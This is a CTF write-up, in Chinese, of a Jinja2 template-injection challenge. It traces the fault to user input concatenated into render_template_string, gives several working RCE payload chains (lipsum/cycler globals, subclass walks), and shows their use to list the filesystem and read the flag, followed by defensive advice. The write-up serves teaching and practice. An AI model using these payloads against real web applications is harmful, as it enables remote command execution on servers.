# 模板里的问候 (EzTemplate) — Jinja2 SSTI WriteUp

- 题目：1000 pts / 动态容器 / SSTI
- 入口：`http://103.163.47.230:32856`
- Flag：`HTUCTF{2ccc6389-1536-49ae-a061-73cfae82e0af}`

## 1. 指纹

```
Server: gunicorn          # Python 应用，大概率 Flask
表单: POST /preview  nickname=CTFer
```

## 2. 判定模板引擎

| 探针 | 回显 | 结论 |
|---|---|---|
| `{{7*7}}` | `你好，49！` | 表达式被**服务端求值** |
| `{{7*"7"}}` | `7777777` | 是 Python 语义（Jinja2/Twig 之外可排除，`7*"7"` 只有 Python 会这样乘字符串） |
| `${7*7}` / `#{7*7}` | 原样回显 | 不是 EL / 不是 Ruby ERB |
| `<%= 7*7 %>` | 原样回显 | 不是 ERB/EJS |

→ **Jinja2 SSTI**。

## 3. 成因（读源码确认）

```python
nickname = request.form.get("nickname", "CTFer")
if len(nickname) > 200: ...
result = render_template_string("你好，" + nickname + "！欢迎使用 EzTemplate。")
```

用户输入被**字符串拼接**进模板源，再交给 `render_template_string` 编译执行。
`render_template`（模板文件）本身是安全的，坏在 `render_template_string` + 拼接。

## 4. 从求值到 RCE

Jinja2 沙箱外，最省事的链是 `lipsum`（模板全局函数）：

```jinja
{{ lipsum.__globals__["os"].popen("id").read() }}
```

- `lipsum.__globals__` 是该函数的模块全局字典，里面有 `os`（Jinja2 `utils.py` 导入了 `os`）
- 拿到 `os` 就等于拿到命令执行

等价备选链（有过滤时按需换）：

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   # 找 subprocess.Popen
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("id").read()}}{% endif %}{% endfor %}
```

## 5. 找 flag

```
{{ lipsum.__globals__["os"].popen("ls -la /").read() }}
```

```
-r--------   1 ctf  ctf    44 Oct 24 01:28 flag
drwxr-xr-x   1 root root 4096 Oct 16 02:55 app
```

`id` → `uid=10001(ctf) gid=10001(ctf) groups=10001(ctf),0(root)`
进程就以 `ctf` 身份跑，所以直接：

```
{{ lipsum.__globals__["os"].popen("cat /flag").read() }}
```

→ `HTUCTF{2ccc6389-1536-49ae-a061-73cfae82e0af}`

## 6. 踩坑

- **双层 HTML 转义**：`render_template_string` 的输出会被 `index.html` 的 `{{ result }}` 再转义一次，
  所以 `<` `>` `'` 变成 `&amp;lt;` 之类。脚本里 `html.unescape()` 调用两次才能还原。
- 前端 `maxlength="200"` 只是浏览器限制，curl/脚本不受影响；服务端也有 200 字符校验，但上面的 payload 只有 55 字符。
- `os.popen` 用双引号包字符串，避免 Jinja 把单引号与外层 `'` 打架。

## 7. 防御

- 永远不要把用户输入拼进模板源码；想插入变量就 `render_template_string("你好，{{ name }}！", name=nickname)`
- 必须渲染不可信模板时用 `jinja2.sandbox.SandboxedEnvironment`
- 容器内最小权限（本题已经是非 root，但 flag 和进程同用户，一样能读）
